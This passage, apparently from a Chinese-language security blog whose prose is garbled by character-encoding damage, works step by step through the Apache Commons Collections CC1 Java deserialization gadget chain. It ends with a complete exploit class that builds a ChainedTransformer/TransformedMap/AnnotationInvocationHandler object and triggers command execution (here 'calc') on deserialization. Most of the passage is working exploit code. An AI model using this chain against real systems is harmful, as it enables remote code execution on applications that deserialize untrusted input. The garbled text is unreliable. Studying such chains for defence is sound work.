alt="image-20240320220648856"></p><p>è¿™é‡Œå…ˆæ”¾ä¸€æ”¾</p><p>å®é™…ä¸Š, ä¸€å…±æœ‰ä¸‰ä¸ªé—®é¢˜å¾…è§£å†³</p><ol><li>ç”±äºåªæœ‰å®ç° äº†Serializable æˆ–è€… Externalizable æ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—, è€ŒRuntimeå¹¶æ²¡æœ‰å®ç°, Runtimeæ— æ³•è¢«åºåˆ—åŒ–ä¾¿æ˜¯ç¬¬ä¸€ä¸ªé—®é¢˜</li><li>ä¸Šå›¾ä¸­memberValue.setValueçš„å‚æ•°å¹¶ä¸æ˜¯æˆ‘ä»¬é¢„æœŸçš„å†…å®¹</li><li>å¦‚ä½•ä¸¤ä¸ªif</li></ol><p>é¦–å…ˆæ˜¯å¦‚ä½•åºåˆ—åŒ–Runtime</p><p><code>Runtime</code>æ˜¯ä¸èƒ½åºåˆ—åŒ–çš„ï¼Œä½†æ˜¯<code>Runtime.class</code>æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>s Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        run.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>InvokerTransformer</code>åå°„è°ƒç”¨Runtime</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//InvokerTransformeråå°„è·å–Runtimeçš„getRuntimeæ–¹æ³•</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">runmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">//InvokerTransformeråå°„ æ‰§è¡Œè·å–åˆ°çš„getRuntimeæ–¹æ³•, è¿”å›ä¸€ä¸ªruntimeå¯¹è±¡</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(runmethod);</span><br><span class="line">        <span class="comment">//åå°„è·å–Runtimeä¸‹çš„execæ–¹æ³•</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">execmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;&#125;).transform(Runtime.class);</span><br><span class="line">        </span><br><span class="line">        execmethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321194633809.png" alt="image-20240321194633809"></p><p>è¿™é‡Œè™½ç„¶æˆåŠŸäº†, ä½†æ˜¯ç´§æ¥ç€å°±å‡ºç°äº†å¦ä¸€ä¸ªé—®é¢˜, åœ¨ä¸€å¼€å§‹æˆ‘ä»¬åªå‘TransformedMap.decorateä¸­ä¼ å…¥äº†ä¸€ä¸ªæˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„invokerTransformerå¯¹è±¡, è€Œç°åœ¨å˜æˆäº†è¿™æ ·ä¸€ä¸²ä»£ç , ä¹Ÿå°±æ˜¯ä»ä¸€æ¬¡transformçš„è°ƒç”¨å˜æˆäº†å¤šæ¬¡transformçš„è°ƒç”¨</p><p>è¿™é‡Œç§»æ­¥è‡³ChainedTransformerè¿™ä¸ªç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321200533277.png" alt="image-20240321200533277"></p><p>è¿™é‡Œçš„transformè¿›è¡Œäº†å¯¹iTransformers[i]çš„é€’å½’è°ƒç”¨, æ­£å¥½å°±æ˜¯æˆ‘ä»¬åå°„ä»£ç ä¸­çš„è¿‡ç¨‹, æˆ‘ä»¬åªéœ€è¦å°†iTransformers[i]èµ‹å€¼ä¸ºinvokerTransformerå³å¯,è¿™æ ·å°±é€šè¿‡åŒåå‡½æ•°è°ƒç”¨åˆ°æˆ‘ä»¬éœ€è¦çš„é‚£ä¸ªtransformæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>ä¸ä¹‹å‰çš„ä»£ç æ‹¼æ¥, æ„é€ ä¸€ä¸ªtransformedmap, åˆ©ç”¨AnnotationInvocationHandlerä¸­readObjectä¸­çš„setValueå»è°ƒç”¨transformedmapä¸­çš„checkSetValue</p><p>å®Œæ•´ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ å…¥åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ¥å£æ¥è§¦å‘readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);<span class="comment">//////////////ä¼ å…¥æ³¨è§£ç±»å’Œtransformedmap</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒè¯•ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321210044455.png" alt="image-20240321210044455"></p><p>å‘ç°æ²¡æœ‰è¿›å»if</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦memberType !&#x3D; null</p><p>ä¸éš¾å‘ç°memberValueå°±æ˜¯ä¼ å…¥çš„map(æœ‰ä¸€ä¸ªé”®å€¼å¯¹â€bbbâ€,â€aaaâ€), åœ¨è¿™é‡Œè·å–äº†å®ƒçš„é”®, å¹¶å°†memberTypesä¸‹æ­¤é”®çš„å€¼èµ‹ç»™memberType </p><p>memberType ç”± memberTypesè®¾ç½®, memberTypesç”±annotationType.memberTypes()è®¾ç½®, è·Ÿè¿›annotationType</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321211135555.png" alt="image-20240321211135555"></p><p>å¯ä»¥çœ‹è§,è°ƒè¯•å™¨å·²ç»æ ‡è®°å‡ºæ¥äº†, è¿™é‡Œçš„typeå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ³¨è§£ç±»</p><p>æˆ‘ä»¬ä¼ å…¥çš„æ³¨è§£ç±»æ˜¯Override, ä½†æ˜¯Overrideä¸­å¹¶æ²¡æœ‰bbbè¿™ä¸ªå±æ€§</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213340551.png" alt="image-20240321213340551"></p><p>å› æ­¤è€ƒè™‘åˆ«çš„æ³¨è§£ç±»</p><p>Targetæ³¨è§£</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213414486.png" alt="image-20240321213414486"></p><p>å¯ä»¥çœ‹è§Targetæœ‰ä¸€ä¸ªvalueå±æ€§, å› æ­¤æˆ‘ä»¬å¯ä»¥å°†mapé”®åæ”¹ä¸ºvalue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213644208.png" alt="image-20240321213644208"></p><p>è¿™æ ·å°±ç›´æ¥è¿›å…¥åˆ°äº†ä¸¤ä¸ªifä¸­</p><p>ä½†æ˜¯è¿™é‡Œè¿˜æœ‰é—®é¢˜,ä¼šæŠ¥é”™</p><p>è¿™æ˜¯å› ä¸º ä¸ºäº†é¿å…Runtimeæ— æ³•åºåˆ—åŒ–çš„é—®é¢˜, æˆ‘ä»¬éœ€è¦ä»Runtime.classå¼€å§‹ åå°„è·å–getRuntimeæ–¹æ³•, å†è·å–Runtimeå¯¹è±¡, å†è·å–execæ–¹æ³•</p><p>è€Œæˆ‘ä»¬æ˜¯ä»ä¸€ä¸ªé€’å½’è°ƒç”¨å¯æ§å¯¹è±¡çš„transformæ–¹æ³•å¼€å§‹çš„, æˆ‘ä»¬èƒ½ä¼ å…¥çš„åªæ˜¯å¯¹è±¡çš„æ•°ç»„, å¦‚ä½•å°†æŠŠRuntime.classæ”¾åœ¨åå°„é“¾çš„é¦–éƒ¨åˆå˜æˆäº†ä¸€ä¸ªæ–°çš„é—®é¢˜</p><p>è¿™é‡Œåˆç§»æ­¥è‡³ConstantTransformerè¿™ä¸ªç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321215356371.png" alt="image-20240321215356371"></p><p>ä¸€åˆ‡éƒ½æ˜¯è¿™ä¹ˆçš„å·§, è¿™ä¸ªç±»ä¸‹æœ‰ä¸€ä¸ªtransformæ–¹æ³•, å®ƒè¿”å›ä¼ å…¥çš„å‚æ•°, æˆ‘ä»¬åªéœ€è¦å®ä¾‹åŒ–å®ƒ, å¹¶æ„é€ å‡½æ•°ä¼ å‚ä¸ºRuntime.class, è¿™è¦Runtime.classå°±ä¼šè¢«è¿”å›å›æ¥, æˆä¸ºåå°„é“¾å­çš„é¦–éƒ¨</p><p>ä¹‹åRuntime.classä¼šæˆä¸ºä¸‹ä¸€æ¬¡transformçš„å‚æ•°(object), ä»è€Œç»•è¿‡AnnotationInvocationHandlerä¸‹setValueä¸­å‚æ•°ä¸å¯æ§çš„é—®é¢˜</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330114646344.png" alt="image-20240330114646344"></p><p>æœ€ç»ˆåˆ©ç”¨ä»£ç :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321215644440.png" alt="image-20240321215644440"></p><p>æˆåŠŸæ‰§è¡Œ!</p><h1 id="CC6"><a href="#CC6" class="headerlink" 